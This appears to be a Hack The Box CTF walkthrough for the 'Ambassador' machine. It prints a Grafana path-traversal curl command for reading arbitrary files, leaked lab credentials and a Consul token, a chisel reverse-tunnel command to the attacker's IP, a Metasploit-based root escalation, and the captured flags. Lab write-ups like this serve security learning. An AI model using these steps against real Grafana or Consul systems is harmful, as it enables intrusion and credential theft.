# **1. Enumeration**
Open ports
 

80 tcp syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu)) 
22 tcp ssh
3000 tcp 
3306 tcp mysql mSQL 8.0.30-0ubuntu0.20.04.2

Checking out the website

## 1.1 port 3000 enumeration 
checking out port 3000 and it looks like another web page
![[Pasted image 20221115234036.png]]
googling the version looks like there is a common vulnerability for grafana 8.0.0 to 8.3.0
![[Pasted image 20221115234314.png]]
# 2. Exploit
copying the list in the python script because the script wasn't working and using burp intruder mode 
![[Pasted image 20221115234402.png]]
![[Pasted image 20221115234412.png]]
![[Pasted image 20221115234426.png]]
and looks like we got a hit on most of the list 
we have 2 users
developer and root
![[Pasted image 20221115234555.png]]
https://community.grafana.com/t/whitch-file-is-the-new-account-information-stored/701
found that dabatase stored in /var/lib/grafana/grafana.db
SQLite
https://github.com/jas502n/Grafana-CVE-2021-43798
password is hashed and stored here
![[Pasted image 20221116001022.png]]
dad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab0690X27trve2uf960YdtaMF2022-03-13 20:26:452022-09-01 22:39:382022-09-14 16:44:19
secret key: SW2YcwTIb9zpOOhoPsMm
![[Pasted image 20221116001745.png]]

![[Pasted image 20221116004810.png]]


# 2. Foothold
found password in plain text in grafana.ini


grafana:admin:messageInABottle685427
![[Pasted image 20221116004901.png]]
didn't find anything
heading back to download sqlite database and analyz it using sqlitebrowser 
```
curl --path-as-is "ambassador.htb:3000/public/plugins/alertlist/../../../../../../../../../../../../../var/lib/grafana/grafana.db" -o grafana.db
```

found mysql creds
![[Pasted image 20221116013740.png]]
mysql:grafana:dontStandSoCloseToMe63221!

```bash
mysql -u grafana -p'dontStandSoCloseToMe63221!' -h ambassador.htb -P 3306 
```
enumurating the database we found the user developer hashed password in base64
![[Pasted image 20221116014840.png]]

![[Pasted image 20221116014821.png]]


# 3. privesc 
ssh :developer:anEnglishManInNewYork027468
![[Pasted image 20221116015022.png]]
#userflag 44a566c885f922ea0dfc70d29314a009

![[Pasted image 20221116020441.png]]
didn't find much 
![[Pasted image 20221116022609.png]]
found readable .git repo owned by root
![[Pasted image 20221116022629.png]]
```bash
git log
```
to see latest commits
![[Pasted image 20221116023303.png]]
Consul is running on the machine on port 8500 and we have also a TOKEN
consul_token:bb03b43b-1d81-d62b-24b5-39540ee469b5
 linpeas showed that earlier also
https://developer.hashicorp.com/consul/docs/intro
![[Pasted image 20221116024049.png]]
Looking for exploits for Consul and we have 2 exploits on metasploit
but it doesn't work so we can try to pivot to chisel and reverse tunnel the service on our machine

on our machine
![[Pasted image 20221116025121.png]]
```
chisel server --reverse -p 9001

```

on our target


![[Pasted image 20221116025549.png]]
```
client 10.10.16.12:9001 R:8500:127.0.0.1:8500

```

We can now access the Consul on our machine and exploit it with metasploit

![[Pasted image 20221116025556.png]]

setting metasploit options (IP PORT ACL_TOKEN) and we run the exploit 
![[Pasted image 20221116032558.png]]

#rootflag baa8fc68e23600a3b994ab3fa151457a
